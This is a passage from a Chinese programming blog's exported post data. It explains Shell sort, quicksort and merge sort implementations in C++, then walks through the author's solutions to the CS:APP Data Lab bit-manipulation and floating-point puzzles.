7，对每个分区执行插入排序···最后由于增量是1，整个序列就变成一个分区了，就是直接的简单插入排序 1234567891011121314151617void Shell_Sort(int arry[],int length)&#123; int gap;int j; //第二层循环是i右界 第三层循环是j左界 for(gap=length&gt;&gt;1;gap&gt;0;gap&gt;&gt;=1)&#123; //gap增量 for(int i=gap;i&lt;length;i++)&#123; int temp=arry[i]; //gap进入循环 先保存了temp的值 其他比它大的值都需要往后移动 //最后在把保存的temp值还给数组 //假设排列的顺序为 5 8 9 6 4 //一开始的gap为2 取的元素 9与5比较不满足条件 6与8比较满足条件 将8给6···· for(j=i-gap;j&gt;=0&amp;&amp;arry[j]&gt;temp;j-=gap) arry[j+gap]=arry[j]; arry[j+gap]=temp; &#125; &#125;&#125; 上述算法中，第一层循环是产生一个gap增量，上面的算法有一个问题最后的一个gap不一定是1。 第二层循环拿到每轮的gap，然后初始位置从每轮的gap开始去遍历序列中gap-length的所有元素，控制进入第三层循环比对的位置； 第三层循环是拿到第二层循环的位置，确定插入排序的分区，假设gap=2，循环位置下标是8，那么插入排序的分区[gap-2] [gap-4] ···· [0 2 4 6]下标对应的值即为分区，[8] 去与四个下标的值分别比对，按照直接插入排序的思想去右移，假设[8]介于[2]和[4]之间，那么此时的j=2，arry[2+2]=temp，这里的temp一开始就保存了arry[8]······ 4.快速排序(递归与非递归) 快速排序采取的也是分区的思想，递归的思路是每次将分区分为左右分区，左右分区内部分别单独处理 假设其中的中间值为分区内的最后一个元素，然后分区内的元素根据中间值排成左右两个序列，序列内部不需要有序，只需要左序列&lt;=中间值，右序列&gt;=中间值，得到的左右序列再分别重复以上操作，直到最后的左右序列只剩下一个元素。 递归的快速排序： 12345678910111213141516171819202122void QuickSort_recursion(int arry[],int start,int end)&#123; if (start &gt;= end) return; int mid = arry[end];//假设其中的中间值为分区内的最后一个元素 int left = start, right = end - 1; while (left &lt; right) &#123; while (arry[left] &lt;= mid &amp;&amp; left &lt; right)//从左界开始与中间值进行比较 如果有大于的中间值的 跳出循环 left++; while (arry[right] &gt;= mid &amp;&amp; left &lt; right)//从左界开始于中间值进行比较 如果有小于中间值的 跳出循环 right--; Swap(arry[left], arry[right]);//交换上面的元素 &#125; if (arry[left] &gt;= arry[end])//此步骤是判断是否需要交换中间值 此时的left与right相等 序列已经分成两个分区 判断是否需要将end的值插入到序列中，如果前面的序列的都比middle小，那么middle不需要插入到序列中，如果大的话就需要插入到序列中 Swap(arry[left], arry[end]); else left++; //如果left是0的话，这样就也可以再分成两个去 提高一点效率 if (left) &#123; QuickSort_recursion(arry, start, left - 1); &#125; QuickSort_recursion(arry, left + 1, end);&#125; 非递归的快速排序： 1234567891011121314151617181920212223242526272829303132333435363738class Range&#123;public:int start,end;public:void set(int start,int end)&#123; this-&gt;start=start; this-&gt;end=end; &#125;&#125;;void QuickSort(int arry[],int length)&#123; if(length&lt;0) return; Range range[length];int p=0; range[p++].set(0,length-1);//首先设置区间中最大的一个分区 也就是整个序列 //其实整个过程也是栈的思想 先进后出 while (p) &#123; //拿到其中一个分区 Range temp=range[--p]; if(temp.start&gt;=temp.end) continue;//如果区间的没有元素则跳过该区间 int mid=temp.end;//按照快速排列的基本思想 取最后一个元素为中间值 int left=temp.start,right=mid-1; //以下过程类似递归的使用 对区间进行左右分区 while (left&lt;right) &#123; while(arry[left]&lt;=arry[mid]&amp;&amp;left&lt;right) left++; while(arry[right]&gt;=arry[mid]&amp;&amp;left&lt;right) right--; Swap(arry[left],arry[right]); &#125; //此时遍历完之后的left==rigt if(arry[left]&gt;=arry[mid]) Swap(arry[left],arry[mid]); else left++; //该区间按照 中间值分成两边之后 将左右的分区各自压栈 range[p++].set(temp.start,left-1); range[p++].set(left+1,temp.end); &#125;&#125; 2。 5.归并排序(递归与非递归) 可以看到上图，首先将序列分成两部分14 12 15 13 11 16，然后再进行分，直到成为单个存在的元素，然后对两部分先排列完之后再排列整个序列，最后一步特别重要。同时需要一个临时数组去存每次排列的结果 归并排序递归： 1234567891011121314151617181920212223void Merge_Sort_recurion(int arry[],int tmp[],int start,int end)&#123; //递归结束条件 if(start&gt;=end) return; //分成左右序列进行递归 int length=end-start; int middle=length/2+start; int start1=start,end1=middle;//start1-end1 int start2=middle+1,end2=end;//start2-end2 Merge_Sort_recurion(arry,tmp,start1,end1); Merge_Sort_recurion(arry,tmp,start2,end2); int p=start; //两组元素对首元素依次进行判断 while(start1&lt;=end1&amp;&amp;start2&lt;=end2)//谁小谁进去 tmp[p++]=arry[start1]&lt;arry[start2]?arry[start1++]:arry[start2++]; //其中一个数组已经完全排列进临时数组后 另一个数组就肯定都比已经排列进去的元素大，所以接下来按顺序存进去就行了 while(start1&lt;=end1) tmp[p++]=arry[start1++]; while(start2&lt;=end2) tmp[p++]=arry[start2++]; //对于start-end已经排列好的赋值到原来的数组 for(int i=start;i&lt;=end;i++) arry[i]=tmp[i];&#125; 递归的过程主要是先不断的分区间，分到最小单位之后，先排列最小单位，然后再往回跳。 分割-分割-分割-分割···-归并-归并-归并 归并排序非递归： 对于非递归使用的是从小到大的过程，初始用dk为1的跨度，也分割到最小的单位，然后就2、4、8、16······ 1234567891011121314151617181920212223242526272829303132333435void Merge_Sort(int arry[],int length)&#123; int *new_arry=arry; int *temp_arry=new int[length]; int dk; for( dk=1;dk&lt;length;dk+=dk)&#123; // int p=0; for(int i=0;i&lt;length;i+=dk+dk)&#123; //遍历加2dk的每个区间，这里end是来判断是否有没有遍历完，不会直接使用arry[end],所以不需要-1 int low=i,mid=min(low+dk,length),high=min(low+dk+dk,length); //将区间分成两个部分，对两个部分的首元素依次进行比较 int start1=low,end1=mid; int start2=mid,end2=high;//因为mid 可能跟high相同 所以mid不能+1 所以下面都是用&lt; while(start1&lt;end1&amp;&amp;start2&lt;end2) temp_arry[p++]=new_arry[start1]&lt;new_arry[start2]?new_arry[start1++]:new_arry[start2++]; while(start1&lt;end1) temp_arry[p++]=new_arry[start1++]; while(start2&lt;end2) temp_arry[p++]=new_arry[start2++]; //遍历一次完成后 转移两个数组的指针 &#125; int *temp=new_arry; new_arry=temp_arry; temp_arry=temp; // std::cout&lt;&lt;&quot;arry：&quot;&lt;&lt;arry&lt;&lt;&quot;new_arry:&quot;&lt;&lt;new_arry&lt;&lt;&quot;temp_arry:&quot;&lt;&lt;temp_arry&lt;&lt;&quot;\\n&quot;; &#125; if(arry!=new_arry)&#123; for(int i=0;i&lt;length;i++) temp_arry[i]=new_arry[i]; temp_arry=new_arry; &#125; delete[] temp_arry;&#125; 假设序列是18 25 13 11 10 dk=1区间被分成18 25 13 11 这里使其不越界通过判断是否超过了length的长度， 对于第一个区间来说start=0 middle=1 end=2(end作为上界并不参与比较) 然后循环的遍历结果存在temp_arry数组的0-1中 应该为 18 25 对于第二个区间来说start=2 middle=3 end=4(end作为上界并不参与比较) 然后循环的遍历结果存在temp_arry数组的2-3中 应该为11 13","categories":[{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"算法","slug":"数据结构/算法","permalink":"http://example.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"},{"name":"数据结构","slug":"数据结构","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"}]},{"title":"深入理解计算机系统-DATA-LAB","slug":"计算机系统/深入理解计算机系统-DATA-LAB","date":"2020-12-04T13:08:47.000Z","updated":"2021-04-01T14:11:12.000Z","comments":true,"path":"2020/12/04/计算机系统/深入理解计算机系统-DATA-LAB/","link":"","permalink":"http://example.com/2020/12/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-DATA-LAB/","excerpt":"","text":"1.bitXOr123456789101112/* * bitXor - x^y using only ~ and &amp; * Example: bitXor(4, 5) = 1 * Legal ops: ~ &amp; * Max ops: 14 * Rating: 1 */int bitXor(int x, int y) &#123; return ~(~(~x&amp;y)&amp;(~(x&amp;~y))); return 2;&#125; 由公式A⊕B=ABI+AIB 进行变形A⊕B=(ABI+AIB)II=((ABI)I&amp;(AIB)I)I; 2.tmin1234567891011/* * tmin - return minimum two&#x27;s complement integer * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 4 * Rating: 1 */int tmin(void) &#123;//return 1&lt;&lt;31; return 0x8&lt;&lt;28; return 2;&#125; 使用位运算获取对二进制补码的最小 int 值，二进制补码的最小值应该就是 1000 0000 0000 0000 0000 0000 0000 0000 3.SpecialBits(x)1234567891011/* * specialBits - return bit pattern 0xffca3fff * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 3 * Rating: 1 */int specialBits(void) &#123; int x=-1; //0xffffffff int y=215&lt;&lt;14; //0xffca3fff^-1 return x^y;&#125; 表示出0xffca3fff，容易知道该数的二进制表示为11111111110010100011111111111111，其中比较重要的是存在0的地方1111111111|0010 1000|11111111111111刚好是8位，由于-1的在计算机的二进制表示111111111111111111111111111111全为1，此时只要0000000000|1101 0111|00000000000000与-1进行异或就能得到结果，最后由于215的二进制表示为11010111，对其进行左移14位就可以得到y的值。 4.fitshort123456789101112/* * fitsShort - return 1 if x can be represented as a * 16-bit, two&#x27;s complement integer. * Examples: fitsShort(33000) = 0, fitsShort(-32768) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 8 * Rating: 1 */int fitsShort(int x) &#123; int y = x &gt;&gt; 15; return !( (y &gt;&gt; 16) ^ y);&#125; 此题主要是判断int型的x能不能用16位二进制补码来表示，首先对于能用16位二进制补码来表示的数应该满足一下格式： 正数：0000 0000 0000 0000 0··· ···· ···· ···· 负数：1111 1111 1111 1111 1··· ···· ···· ···· 其中省略号为1或0，所以如果将该右移15位之后（由于是有符号数的右移所以为算术右移）可能补上的1或者为0取决于符号位，右移结果如果全为1或者全为0，此时就代表着该数能用16位二进制补码表示，最后的return !( (y &gt;&gt; 16) ^ y)第一次右移结果再进行右移16位获得一个全为1或者全为0与第一次右移的序列进行异或，异或的结果如果不为0，则代表着该数不能用16位二进制补码表示。 举个例子 0000 0000 0000 0010 0111 1111 1111 1111进行第一次右移得到 0000 0000 0000 0000 0000 0000 0000 0010判断该位模式是否为全0，再对其进行右移16位得到 0000 0000 0000 0000 0000 0000 0000 0000一个全0序列，此时再与原序列进行异或得到结果不为0，则代表着输入的结果低位有效数字不止15位 5.isTmax(x)123456789101112131415/* * isTmax - returns 1 if x is the maximum, two&#x27;s complement number, * and 0 otherwise * Legal ops: ! ~ &amp; ^ | + * Max ops: 10 * Rating: 1 */int isTmax(int x) &#123; int i = x+1;//Tmin,1000... x=x+i;//-1,1111... x=~x;//0,0000... i=!i;//exclude x=0xffff... x=x+i;//exclude x=0xffff... return !x;&#125; 此题判断的是输入的值是不是最大值（这里的最大值指的是符号为0，其他位全为1），如果是最大值就返回一个1。如果传入的是最大值，可以考虑先把该数转为全0，再对其进行非操作，最后得出的结果就是1。对最大值加1之后由于补码的特性此时位模式应该为10000000····000然后再跟他本身1111···111相加之后就得到了一个全为1的序列，再对其进行取反就得到全为0； 但是如果传入的是-1，此时对其+1会得到一个全0序列，再执行第二步也会得到一个全1的序列，结果也是一样，此时第三步第四步是为了防止这种情况，因为最大值执行到第三步此时的i是为1000··000而-1则是全为0000···000，再对其进行非操作的话，最大值情况的i会全为0，而-1情况的i则是变为1，所以在加上一个x的全0序列的话-1情况下的x就不为0了 如果其他数在第一步+1情况下就不会溢出，所以就没法得到一个全为1的序列 6.allOddBits(x)12345678910111213141516171819 * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least ificant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int allOddBits(int x) &#123;//AAAA AAAA int mask = 0xAA+(0xAA&lt;&lt;8); mask=mask+(mask&lt;&lt;16); //int mask=0xAAAAAAAA; return !((mask&amp;x)^mask); return 2;&#125; 该题主要是如果奇数位置全为1的话，就返回1，如果没有就返回0。主要核心是构造序列‭10101010101010101010101010101010‬也就是mask，然后mask与x及进行第一次&amp;操作，第一种得到的结果如果奇数位全为1的话还是mask这个序列，第二种如果有不为1的话会缺失一定数量奇数位的1，再将得到的结果与mask进行异或就能分别出以上两种情况，如果异或的结果为0就是第一种情况，在进行！操作就能输出1，如果异或的结果为1就是第二种情况，再进行!操作就会输出0。 7.anyEvenBit(x)12345678910111213141516/* * anyEvenBit - return 1 if any even-numbered bit in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples anyEvenBit(0xA) = 0, anyEvenBit(0xE) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 2 */int anyEvenBit(int x) &#123; int a=0x5; int b=(a&lt;&lt;4)+a; a=(b&lt;&lt;8)+b; b=(a&lt;&lt;16)+a; x=x&amp;b; return !!x;&#125; 该程序主要是如果0-31位的位模式如果偶数位出现1，则返回一个1，如果偶数位都为0，则返回1。基本思路就x与一个偶数位全为1的数进行&amp;运算，这样运算下来的值如果不为0，则代表偶数位存在1，返回1。5的二进制数为0101，对其进行偏移到01010101010101010101010101010101该数的偶数为全为1就是最后b的值。然后如果运算结果x最后不为0要输出1，所以进行两次非操作。 8.negate(x)1234567891011/* * negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) &#123; return ~x+1; return 2;&#125; 此题主要进行的是一个求负数，按照补码的原理进行操即可（取反加1) 9.isAsciiDigit(x) 计算输入值是否是数字 0-9 的 ASCII 值。 1234567891011121314151617/* * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;) * Example: isAsciiDigit(0x35) = 1. * isAsciiDigit(0x3a) = 0. * isAsciiDigit(0x05) = 0. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 15 * Rating: 3 */ int isAsciiDigit(int x) &#123; int sign=0x1&lt;&lt;31; //1 000···00 int up=~(sign|0x39); //得到的序列是 int down=~0x30; up=(up+x)&gt;&gt;31; down=(down+1+x)&gt;&gt;31; return !(up|down);&#125; 由于ASCII 码0-9代表的数值为48-57：两种情况，第一种情况对于大于57的数字，应该构造一个序列，应该构造符号位为0，其他位置是加上57以上的数就会溢出到符号位，由于57位模式为‭00111001‬，其构造的序列应该为‭01111111111111111111111111000110‬‬也就是其有效位置应该与57相反；第二种情况对于小于48的数字，直接对48取反会得到-49，此时的符号位为1，对它加上+1+（48以上的数字）就会溢出到符号位变为0。 由于以上的两种情况都是符号位为0代表着着输出的数值为48-57，如果为1代表着输出不在这个范围，由于int是有符号数，对其进行的右移为逻辑右移，符号位为0的话右移的结果就会为0，在输入范围内的值up|down的输出应该都全为0，如果一个不满足的话都会产生一个非0序列，再对其进行！操作就可以获得输出结果。 10.conditional（x,y,z)123456789101112/* * conditional - same as x ? y : z * Example: conditional(2,4,5) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 16 * Rating: 3 */int conditional(int x, int y, int z) &#123; x = !!x; x = ~x+1; return (x&amp;y)|(~x&amp;z);&#125; 此题是实现一个三目运算符，首先输入的x不为0，输出y不输出z，将y与全1的序列相与，将z与一个全0的序列相与就可以得到结果。对非0的x进行!!操作可以得到1，再取反+1得到一个全1序列满足上述情况；输入的x为0，进行两次非操作，再取反加1得到的结果还是全为0的序列，刚好与上述情况相反。 11.isLessOrEqual(x,y)123456789101112131415161718/* * isLessOrEqual - if x &lt;= y then return 1, else return 0 * Example: isLessOrEqual(4,5) = 1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 24 * Rating: 3 */int isLessOrEqual(int x, int y) &#123; int negX=~x+1;//-x int addX=negX+y;//y-x int checkSign = addX&gt;&gt;31&amp;1; //y-x的符号 int leftBit = 1&lt;&lt;31;//最大位为1的32位有符号数 int xLeft = x&amp;leftBit;//x的符号 int yLeft = y&amp;leftBit;//y的符号 int bitXor = xLeft ^ yLeft;//x和y符号相同标志位，相同为0不同为1 bitXor = (bitXor&gt;&gt;31)&amp;1;//符号相同标志位格式化为0或1 return ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;31));//返回1有两种情况：符号相同标志位为0（相同）位与 y-x 的符号为0（y-x&gt;=0）结果为1；符号相同标志位为1（不同）位与x的符号位为1（x&lt;0）&#125; 此题要求输出的x比y小，其实补码一开始被使用的话也是为了实现减法。输入有两种情况，第一种情况为是否为相反符号，如果为相反符号，那么x应该为负数符号位为1才满足情况；第二种情况符号相同，对其进行y-x的操作，对x进行取反+1得到了-x，在与y进行相加，对相加的结果进行&gt;&gt;31得到0或1，如果y-x&gt;=0的，checkSign应该为0，满足要求。 12.ezTreeFourths(x)12345678910111213141516/* * ezThreeFourths - multiplies by 3/4 rounding toward 0, * Should exactly duplicate effect of C expression (x*3/4), * including overflow behavior. * Examples: ezThreeFourths(11) = 8 * ezThreeFourths(-9) = -6 * ezThreeFourths(1073741824) = -268435456 (overflow) * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 3 */int ezThreeFourths(int x) &#123; x = x + (x &lt;&lt; 1); return (x+(x&gt;&gt;31&amp;3))&gt;&gt;2; return 2;&#125; 此题主要是int的除法，由于int的乘法与除法主要通过左移右移实现，所以对于x3/4我们可以分解成乘3除4，x+(x&lt;&lt;1)实现的就是x3；而除4对于正数来说直接左移2位就行，因为是直接舍去小数位置 例如：35/4=8.75-&gt;8 2.33-&gt;2 二进制表示就是 ‭00100011‬(35) 000100.11(8.75) 直接舍去小数位置得到一个0100(8)，所以除以4直接将最后两位舍去就行 对于负数来说 例如：-35/4=-8.75-&gt;-8 用二进制表示‭111111111111111111111111 1101 1101‬(-35) 如果直接右移两位的话则变成‭111111111111111111111111 1111 0111‬(-9) 而要得到‭111111111111111111111111 1111 1000‬(-8)则应该将最后两位进位，加上0011， ‭11111111111111111111111111100000‬(-32)在对其进行右移两位得到就是-8。 负数进行除法的时候要小数部分要先保存下来，不然直接舍去的话数字会变小，就是往负无穷靠近 正数除法未除尽变小，负数变大（都是舍去小数部分） 13.logicalNeg(x)123456789101112/* * logicalNeg - implement the ! operator, using all of * the legal operators except ! * Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 * Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 12 * Rating: 4 */int logicalNeg(int x) &#123; return ~(((~x+1)|x)&gt;&gt; 31)&amp;1; return 2;&#125; 此题是为了实现非运算，如果是非0数的话输出0，0数输出为1。 对于正数来说的话取反+1得到的符号位肯定与元素不一样，而对于负数来说的话如果是tmin=‭-2147483648‬取反加1是它本身，符号位不变，所以不能用^进行操作，必须使用|。 14.howmanyBits(x)123456789101112131415161718192021222324/* howManyBits - return the minimum number of bits required to represent x in * two&#x27;s complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) &#123; int n = 0; x ^= (x&lt;&lt;1); n += ((!!(x&amp;((~0)&lt;&lt;(n+16)))) &lt;&lt; 4); n += ((!!(x&amp;((~0)&lt;&lt;(n+8)))) &lt;&lt; 3); n += ((!!(x&amp;((~0)&lt;&lt;(n+4)))) &lt;&lt; 2); n += ((!!(x&amp;((~0)&lt;&lt;(n+2)))) &lt;&lt; 1); n += (!!(x&amp;((~0)&lt;&lt;(n+1)))); return n+1; return 2;&#125; 此题是判断需要多少位的补码能表示该数字，其实实质就是找到最高位的1在哪个位置，由于补码的特性有一位表示符号位，所以对于输入的数字应该进行预先的处理x^(x&lt;&lt;1)。 假设输入的数字为0000 1000(8)，处理后的结果为0001 1000将符号位置为1，需要5位补码。 1111 1000‬（-8）处理的结果为0000 1000符号位置同样被置为1，该数需要4位补码。 ‭0000 000 0 1000 1001 0000 0000 0000 0000 ‭8978432‬有效补码应该是25‭0000 000 1 1000 1001 0000 0000 0000 0000比较前16位（掩码&lt;&lt;0+16）满足条件+16比较前8位（掩码&lt;&lt;16+8）满足条件 16+8=24比较前4位 （掩码&lt;&lt;24+4）满足条件比较前6位 （掩码&lt;&lt;24+2)不满足条件比较前7位 （掩码&lt;&lt;24+1不满足条件 由于最后比较是4+2+1七个位置，所以最后结果必须加1才能得到24+1=25 上面的掩码都为全1也就是-1 15.bitParity(x)12345678910111213141516/* * bitParity - returns 1 if x contains an odd number of 0&#x27;s * Examples: bitParity(5) = 0, bitParity(7) = 1 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 20 * Rating: 4 */int bitParity(int x) &#123; x^=x&gt;&gt;16; x^=x&gt;&gt;8; x^=x&gt;&gt;4; x^=x&gt;&gt;2; x^=x&gt;&gt;1; return x&amp;1; return 2;&#125; 若x中含有奇数个0返回1，由于输出的int型是32位，所以如果奇数个1代表着也同样有奇数个0；基本思路是算出输入的数是否有奇数个1，由于不需要输出个数，所以判断是否有就行，此时我们可以使用二分法进行异或，使里面的1进行抵消，将结果存在最低的一位，如果最低1位为1，则代表里面有奇数个1，没办法完全抵消，0则反之。 例如0000 0110 1001 1111 0110 1011 1100 0111(111111111)x^=x&gt;&gt;16 得到0000 0110 1001 1111|0110 1101 0101 1000得到的结果存在低16位，继续 x^=x&gt;&gt;8 得到0000 0110 1001 1001 1111 0010|0011 0101得到的结果存在低8位，继续 x^=x&gt;&gt;4 得到0000 0110 1111 0000 0110 1101 0001|0110得到的结果存在低4位，继续 x^=x&gt;&gt;2 得到0000 0111 0100 1100 0111 0110 0101 00|11得到的结果存在低2位，继续x^=x&gt;&gt;1 得到0000 0100 1110 1010 0100 1101 0111 101|0得到的结果存在最后1位。即为对答案，最低位由于是0，所以该序列中有偶数个1，同样有偶数个0，返回0。 16.intLog2(x)1234567891011121314151617/* * intLog2 - return floor(log base 2 of x), where x &gt; 0 * Example: intLog2(16) = 4 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int intLog2(int x) &#123; int n = 0; n += ((!!(x&amp;((~0)&lt;&lt;(n+16)))) &lt;&lt; 4); n += ((!!(x&amp;((~0)&lt;&lt;(n+8)))) &lt;&lt; 3); n += ((!!(x&amp;((~0)&lt;&lt;(n+4)))) &lt;&lt; 2); n += ((!!(x&amp;((~0)&lt;&lt;(n+2)))) &lt;&lt; 1); n += (!!(x&amp;((~0)&lt;&lt;(n+1)))); return n; return 2;&#125; 对于‭0001 0000‬(16)来说，其log216=4,可以看到其实就是最高位置-1，类似第14题，不过此题输入没有负数，所以直接判断到最高位就行了。 17.floatNegate(unsigned uf)12345678910111213141516//float/* * floatNegate - Return bit-level equivalent of expression -f for * floating point argument f. * Both the argument and result are passed as unsigned int&#x27;s, but * they are to be interpreted as the bit-level representations of * single-precision floating point values. * When argument is NaN, return argument. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 10 * Rating: 2 */unsigned floatNegate(unsigned uf) &#123; if((uf&amp;0x7fffffff) &gt; 0x7f800000) return uf; return uf ^ 0x80000000;&#125; 计算浮点数-uf，主要是判断是否是无穷大，根据浮点数的概念0|0000000|0000··0000 阶码时否全为1则为无穷大，所以‭01111111111111111111111111111111‬(0x7fffffff)将符号位转为相同，然后与‭01111111100000000000000000000000‬(0x7f800000)相比较如果大于该数则转为浮点数时必位无穷大，直接返回，其他情况改变一下符号。 18.floatScale(unsigned uf)1234567891011121314151617181920212223242526272829303132/* * floatScale2 - Return bit-level equivalent of expression 2*f for * floating point argument f. * Both the argument and result are passed as unsigned int&#x27;s, but * they are to be interpreted as the bit-level representation of * single-precision floating point values. * When argument is NaN, return argument * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */unsigned floatScale2(unsigned uf) &#123; unsigned flag = uf&gt;&gt;31;//由于是无符号数的右移，所以flag是1或0，记录符号位 unsigned exp = (uf&gt;&gt;23)&amp;0xff;//提取阶码 阶码是8位 1位符号位 去除符号位 //规格化的 直接阶码加一再替换原来的阶码就好 int res_exp = (exp + 1)&lt;&lt;23; int res = uf &amp; 0x807fffff;//提取尾数 //无穷大返回自身 if(exp == 255) return uf; //非规格化的 if(exp == 0) &#123; //如果尾数的第一位为0，直接左移是*2，如果尾数的第一位为1，将该1左移到阶码也是*2 uf = uf &lt;&lt; 1; uf = uf | (flag&lt;&lt;31); return uf; &#125; //规格化的 直接阶码加一再替换原来的阶码就好 return res | res_exp;&#125; 该题计算浮点数2*f，对于此题根据浮点数的标准，将符号位(uf&gt;&gt;31)，阶码位(uf&gt;&gt;23&amp;0xff)，尾数位(uf&amp; 0x807fffff)；根据阶码位可以将分位规格化值和非规格化值和无穷大 规格化的值直接将阶码+1然后返回就行 非规格化的值通过计算发现不管尾数第一位是1或0将其左移一位得到的也是*2 无穷大直接返回自身 19.floatFloat2Int(uf)12345678910111213141516171819202122232425262728293031323334353637383940414243/* * floatFloat2Int - Return bit-level equivalent of expression (int) f * for floating point argument f. * Argument is passed as unsigned int, but * it is to be interpreted as the bit-level representation of a * single-precision floating point value. * Anything out of range (including NaN and infinity) should return * 0x80000000u. * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while * Max ops: 30 * Rating: 4 */int floatFloat2Int(unsigned uf) &#123; unsigned flag = uf&gt;&gt;31;//由于是无符号数的右移，所以flag是1或0，记录符号位 unsigned exp = (uf&gt;&gt;23)&amp;0xff;//提取阶码 去除符号位 unsigned last_num = uf&amp;0x7fffff;//提取尾数 //规格化的 int real_exp = exp - 127;//移码减去偏置 这里一定要是int型 不然没办法判断是否大于0 unsigned real_last_num = last_num | 0x800000;//添上隐式的1 //无穷大和nan if(exp == 255) return 0x80000000; //非规格化的 if(exp == 0) return 0; //非常接近0的小数 直接舍弃小数变为0 //规格化的 if(real_exp &gt;= 0) &#123; if(real_exp&gt;=31)//overflow return 0x80000000; real_last_num = real_last_num &gt;&gt; (23 - real_exp);//移码的意义 而且对于小数部分舍弃了 if(flag)//若是负数 还要转为补码形式 real_last_num= ~real_last_num+1; return real_last_num; &#125; //real_exp&lt;0 则说明是绝对值小于1的数 直接返回0 return 0;&#125; 首先举个例子：int的875表示0000 0000 0000 0000 ‭0000 0011 0110 1011‬ ​ float的875.00表示 0, 10001000, 1011 0101 100000000000000 float转化成int型，首先是对于读出阶码e=136，E=136-127=9，尾数f=1.708984375，所以结果V=1.708984375*29=875。而其中的进制转化可以看成尾数位模式前+1得到序列 000000001, 1011 0101 100000000000000然后对该序列右移23-9=14即可得到int表示的结果 —————————————————————————————————————————— 对于此题其实主要的算法就是上述例子，首先判断该数是否位规格数，如果是非规格数或无穷大直接舍去；判断之后算出该阶码，如果阶码大于31的话，此时23-减去阶码位得到小于等于-8的数，此时由于左移的最大限度只能到31位，32位为符号位，所以最多只能左移7位(其中包括隐式位)。 20.floatPower(x)1234567891011121314151617181920/* * Power2 - Return bit-level equivalent of the expression 2.0^x * (2.0 raised to the power x) for any 32-bit integer x. * * The unsigned value that is returned should have the identical bit * representation as the single-precision floating-point number 2.0^x. * If the result is too small to be represented as a denorm, return * 0. If too large, return +INF. * * Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while * Max ops: 30 * Rating: 4 */unsigned floatPower2(int x) &#123; int exp = x + 127; if(exp &lt;= 0) return 0; if(exp &gt;= 255) return 0x7f800000; return exp &lt;&lt; 23;&#125; 此题是没什么难度，根据浮点数的位模式，如果尾数全为0的话，f=1，又E=e-127，所以+127得到e，e是第24位到31位，直接左移23位就可以V=1x2x=1x2e-127,假设要算28它的浮点数位模式应该是0 1000 0111‬ 0000 0000 0000 0000 0000 000也就是将10000111‬(8+127)左移23位。","categories":[{"name":"深入理解计算机系统","slug":"深入理解计算机系统","permalink":"http://example.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"计算机系统","slug":"计算机系统","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"}]},{"title":"深入理解计算机系统-信息的表示和处理","slug":"计算机系统/深入理解计算机系统-信息的表示和处理","date":"2020-12-02T12:47:27.000Z","updated":"2021-04-01T14:11:14.000Z","comments":true,"path":"2020/12/02/计算机系统/深入理解计算机系统-信息的表示和处理/","link":"","permalink":"http://example.com/2020/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E5%A4%84%E7%90%86/","excerpt":"","text":"1.字数据的大小计算机都有一个字长，指明指针数据的标称大小，所以字长决定的最重